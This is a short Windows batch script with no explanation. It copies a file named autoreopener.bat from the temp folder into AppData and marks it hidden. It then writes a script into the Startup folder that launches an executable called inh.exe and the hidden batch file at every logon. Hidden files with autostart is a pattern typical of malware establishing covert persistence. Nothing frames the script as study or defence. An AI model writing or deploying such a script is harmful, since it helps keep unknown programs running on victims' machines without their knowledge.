@echo off
set "src=%TEMP%\autoreopener.bat"
set "startup=%userprofile%\AppData"

if not exist "%src%" (
    echo Source file not found: %src%
    pause
    exit /b
)

copy "%src%" "%startup%\autoreopener.bat" /Y
attrib +h "%startup%\autoreopener.bat"

if %ERRORLEVEL%==0 (
    echo File copied successfully.
) else (
    echo Copy failed. Check permissions.
)


set "outfile=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\created_script.bat"

(
    echo @echo off
    echo start "" "%USERPROFILE%\AppData\inh.exe"
    echo start "" "%USERPROFILE%\AppData\autoreopener.bat"
) > "%outfile%"





